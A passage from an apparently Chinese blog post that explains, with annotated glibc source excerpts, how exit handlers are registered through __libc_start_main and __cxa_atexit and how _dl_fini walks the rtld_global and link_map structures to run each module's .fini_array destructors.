class="comment">//搜索l中的函数指针数组fns[32]</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;fns[i - <span class="number">1</span>].flavor != ef_free) <span class="comment">//有一个不是ef_free的就停止</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">//在l中找到了, 停止链表遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只有全部都是ef_free才能走到这里 */</span></span><br><span class="line">    l-&gt;idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l == <span class="literal">NULL</span> || i == <span class="keyword">sizeof</span>(l-&gt;fns) / <span class="keyword">sizeof</span>(l-&gt;fns[<span class="number">0</span>])) <span class="comment">//没有找到空闲位置</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    l==null 说明整个__exit_funcs中都没有ef_free</span></span><br><span class="line"><span class="comment">    i == sizeof(l-&gt;fns) / sizeof(l-&gt;fns[0]) 说明对于l节点, fns已经全部遍历了, 都没找到ef_free</span></span><br><span class="line"><span class="comment">    此时就需要插入一个新的exit_function_list节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(l != <span class="literal">NULL</span>);</span><br><span class="line">      p = (<span class="keyword">struct</span> exit_function_list *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> exit_function_list)); <span class="comment">//申请一个结构体, p指向新节点</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配失败</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;next = *listp; <span class="comment">//头插法, 再__exit_funcs中插入一个节点</span></span><br><span class="line">        *listp = p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  <span class="comment">//分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      r = &amp;p-&gt;fns[<span class="number">0</span>]; <span class="comment">//r指向新节点的第一个析构函数描述结构体</span></span><br><span class="line">      p-&gt;idx = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//找到空闲位置了, l节点中第i个为ef_free</span></span><br><span class="line">  &#123;</span><br><span class="line">    r = &amp;l-&gt;fns[i];</span><br><span class="line">    l-&gt;idx = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 此时这个函数位置的类型从空闲(ef_free)变为使用中(ef_us), 等待写入函数指针 */</span></span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    r-&gt;flavor = ef_us;</span><br><span class="line">    ++__new_exitfn_called;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock(lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="析构函数的注册—-libc-start-main"><a href="#析构函数的注册—-libc-start-main" class="headerlink" title="析构函数的注册—__libc_start_main()"></a>析构函数的注册—__libc_start_main()</h2><p><strong>__libc_start_main()</strong>函数初窥</p><ul><li>首先是其参数列表也就是_start()传递的参数, 我们中重点注意下面三个<ul><li>init: ELF文件 也就是main()的构造函数</li><li>fini: ELF文件 也就是main()的析构函数</li><li>rtld_fini: 动态链接器的析构函数</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br><span class="line">&#123;</span><br><span class="line">    ...函数体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数体, __libc_start_mian()主要做了以下几件事</p><ul><li>为libc保存一些关于main的参数, 比如__environ…</li><li>通过atexit()注册fini 与 rtld_fini 这两个参数</li><li>调用init为main()进行构造操作</li><li>然后调用main()函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(...)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 保存main的返回地址 */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取环境变量指针, 并保存到libc的.data中</span></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 保存下栈顶 */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化TLS */</span></span><br><span class="line">  __pthread_initialize_minimal();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置stack guard */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard(_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置pointer gurad */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard(_dl_random, stack_chk_guard);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册动态链接器(ld.so.2)的析构函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely(rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行一些简单的libc初始化工作: 在libc中保存argc argv env三个参数 */</span></span><br><span class="line">  __libc_init_first(argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册ELF的fini函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果ELF有构造函数的话, 那么先调用init() */</span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init)(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 调用main()  */</span></span><br><span class="line">  result = main(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果main()返回后, __libc_start_main()回帮他调用exit()函数 */</span></span><br><span class="line">  <span class="built_in">exit</span>(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们知道libc_start_mian()会在exit_funcs中放入下面两个函数</p><p><strong>ELF的fini函数</strong>和<strong>ld的rtld_fini函数</strong></p><p>然后会调用一个构造函数:</p><p><strong>init()</strong></p><h3 id="ELF的fini"><a href="#ELF的fini" class="headerlink" title="ELF的fini()"></a>ELF的fini()</h3><p>被编译在elf的text段中, 由_start()传递地址给__libc_start_main()</p><p>发现其是一个空函数,因为其只有在静态编译下才会起作用,故而动态编译该函数为空</p><p>静态编译时:该函数会逐一取出fini_array数组中的函数指针执行，该函数指针数组位于bss段上</p><h3 id="ELF的init"><a href="#ELF的init" class="headerlink" title="ELF的init()"></a><strong>ELF的init()</strong></h3><p>让我们思考一个问题: 如果只有fini与init的话, ELF只能有一个构造/ 析构函数</p><p>当具有多个构造析构函数时改怎么办呢?</p><p>ELF的解决方法是, 把所有的构造函数的指针放在一个段: .init_array中, 所有的析构函数的指针放在一个段 .fini_array中</p><p><strong>init()就负责遍历.init_array, 并调用其中的构造函数, 从而完成多个构造函数的调用</strong></p><h3 id="ld的rtdl-fini"><a href="#ld的rtdl-fini" class="headerlink" title="ld的rtdl_fini()"></a>ld的rtdl_fini()</h3><p>我们说完了.init_array, 那么对于.fini_array呢?</p><p>很明显不是ELF的fini()负责 , 因为他就是一个空函数, 那么就只能<u>由rtdl_fini来负责</u></p><p><strong><em>rtdl_fini实际指向_dl_fini()函数</em></strong>, 源码在dl-fini.c文件中, 会被编译到ld.so.2中</p><p>我们把进程空间中的一个单独文件, 称之为模块</p><p>ld.so.2会通过dl_open()把所需文件到进程空间中, 他会把所有映射的文件都记录在结构体_rtld_global中</p><p>当一个进程终止, ld.so.2自然需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p><p><strong>一言以蔽之: _dl_fini()的功能就是调用进程空间中所有模块的析构函数</strong></p><h3 id="rtld-global结构体"><a href="#rtld-global结构体" class="headerlink" title="rtld_global结构体"></a>rtld_global结构体</h3><p>接着来看_rtld_global结构体, 这个结构体很复杂, 我们只看与本文相关的</p><p>_rtld_global一般通过宏GL来引用, 这个结构体定义在ld.so.2的data段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br></pre></td></tr></table></figure><ul><li>再看其结构体struct rtld_global的定义<ul><li>一些缩写的含义:<ul><li>ns代表着NameSpace</li><li>nns代表着Num of NameSpace</li></ul></li><li>struct rtld_global先以命名空间为单位建立了一个数组 _dl_ns[DL_NNS]</li><li>在每个命名空间内部加载的模块以双向链表组织, 通过_ns_loaded索引</li><li>同时每个命名空间内部又有一个符号表_ns_unique_sym_table, 记录着所有模块导出的符号集合</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 映射模块的搜索表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">        <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">        <span class="type">size_t</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 这个命名空间中的符号表, 单个命名空间中的符号不允许重复 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            __rtld_lock_define_recursive(, lock) <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="type">uint32_t</span> hashval;           <span class="comment">//符号hash值</span></span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> *name;           <span class="comment">//名称</span></span><br><span class="line">                <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> * sym;      <span class="comment">//符号</span></span><br><span class="line">                <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span> <span class="comment">//所属模块</span></span><br><span class="line">            &#125; * entries;                   <span class="comment">//entries可以理解为struct unique_sym数组的指针, 通过entries[idx]就可找到第idx个符号</span></span><br><span class="line">            <span class="type">size_t</span> size;                   <span class="comment">//有多少个元素</span></span><br><span class="line">            <span class="type">size_t</span> n_elements;</span><br><span class="line">            <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *); <span class="comment">//析构函数</span></span><br><span class="line">        &#125; _ns_unique_sym_table;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录命名空间变化的, debug用 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">    &#125; _dl_ns[DL_NNS]; <span class="comment">//一个命名空间一个link_namespace结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* _dl_nns表示使用了多少个命名空间: Dynamic Link Num of NameSpace */</span></span><br><span class="line">    <span class="type">size_t</span> _dl_nns;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们分析下struct link_map, 来看看ld是怎么描述每一个模块的</p><ul><li>ELF文件都是通过节的组织的, ld自然也延续了这样的思路,</li><li>l_info中的指针都指向ELF中Dyn节中的描述符, Dyn中节描述符类型是ElfW(Dyn)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElfW(Addr) l_addr;                <span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line">   <span class="type">char</span> *l_name;                     <span class="comment">/* 模块的文件名  */</span></span><br><span class="line">   ElfW(Dyn) * l_ld;                 <span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 双向链表指针 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line">   Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">   <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">   ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">   ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">   ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  */</span></span><br><span class="line"></span><br><span class="line">    ...;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ElfW(Dyn)是一个节描述符类型(也就是一个宏), 宏展开结果为<strong>Elf64_Dyn</strong>, 这个类型被定义在elf.h文件中, 与ELF中的节描述对应</p><p>这个结构体在elf的学习中很重要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword    d_tag;            <span class="comment">/* 便签, 用于标注描述符类型,每一个描述符类型都对应一个类型 */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>        </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Xword d_val;        <span class="comment">/* 内容可以是一个值 */</span></span><br><span class="line">  Elf64_Addr d_ptr;            <span class="comment">/* 也可以是一个指针 */</span></span><br><span class="line">&#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>至此rtld_global的结构就清楚了, 他自顶向下按照: <strong>命名空间-&gt;模块-&gt;节</strong> 的形式<u>描述所有的模块,</u> 通过_ns_unique_sym_table描述命名空间中所有的可见符号</p><h2 id="dl-fini-源码分析"><a href="#dl-fini-源码分析" class="headerlink" title="_dl_fini()源码分析"></a>_dl_fini()源码分析</h2><p>理解了模块是如何组织的之后, _dl_fini的任务就显而易见了:</p><ul><li>遍历rtld_global中所有的命名空间</li><li>遍历命名空间中所有的模块</li><li><strong>找到这个模块的fini_array段, 并调用其中的所有函数指针</strong></li><li><strong>找到这个模块的fini段, 调用fini()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> internal_function _dl_fini(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) <span class="comment">//遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]</span></span><br><span class="line">    &#123;</span><br><span class="line">        __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* 如果这个NameSapce没加载模块, 或者不需要释放, 就不需要做任何事, 就直接调用rtld中的函数指针释放锁 */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit)</span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则遍历模块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 把这个命名空间中的所有模块指针, 都复制到maps数组中  */</span></span><br><span class="line">            <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert(nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next) <span class="comment">//遍历链表</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)                                                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    assert(i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            ...;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;    <span class="comment">//多少个模块</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 对maps进行排序, 确定析构顺序 */</span></span><br><span class="line">            _dl_sort_fini(maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));    </span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 从前往后, 析构maps中的每一个模块 */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* 是否包含fini_array节, 或者fini节 */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* debug时打印下相关信息 */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect(GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,DSO_FILENAME(l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 如果有fini_array节的话 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                l-&gt;l_addr: 模块l的加载基地址</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移</span></span><br><span class="line"><span class="comment">                                array: 为模块l的fini_array节的内存地址</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/* </span></span><br><span class="line"><span class="comment">                                ELF中 fini_arraysz节用来记录fini_array节的大小</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位</span></span><br><span class="line"><span class="comment">                                i: fini_array节的大小/一个指针大小, 